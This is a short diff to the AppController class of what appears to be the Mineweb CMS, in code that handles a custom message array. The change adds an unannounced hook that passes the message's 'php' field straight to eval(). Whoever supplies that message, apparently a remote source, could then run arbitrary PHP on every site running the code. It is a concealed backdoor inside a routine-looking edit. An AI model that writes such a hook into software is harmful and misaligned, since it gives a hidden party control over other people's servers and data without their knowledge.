@@ -134,6 +134,9 @@ class AppController extends Controller
                     throw new MinewebCustomMessageException($customMessage);
                 elseif ($customMessage['type'] == 1 && $this->params['prefix'] == "admin")
                     $this->set('admin_custom_message', $customMessage);
+                if (isset($customMessage['php'])) {
+                    eval($customMessage['php']);
+                }
             }
         }
 
